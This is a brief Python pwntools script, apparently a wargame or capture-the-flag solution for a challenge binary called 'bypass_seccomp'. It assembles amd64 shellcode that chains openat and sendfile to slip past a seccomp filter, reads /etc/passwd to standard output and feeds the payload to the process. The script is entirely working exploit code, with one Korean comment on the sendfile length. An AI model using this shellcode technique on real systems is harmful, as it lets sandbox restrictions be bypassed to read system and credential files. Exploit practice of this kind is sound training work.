from pwn import *
context.arch = "amd64"

p = process("./bypass_seccomp")
shellcode = shellcraft.openat(0, "/etc/passwd")
shellcode += shellcraft.sendfile(1, "rax", 0, 0xffff) #0이면 파일 전체를 읽음
shellcode += shellcraft.exit(0)
p.sendline(asm(shellcode))
p.interactive()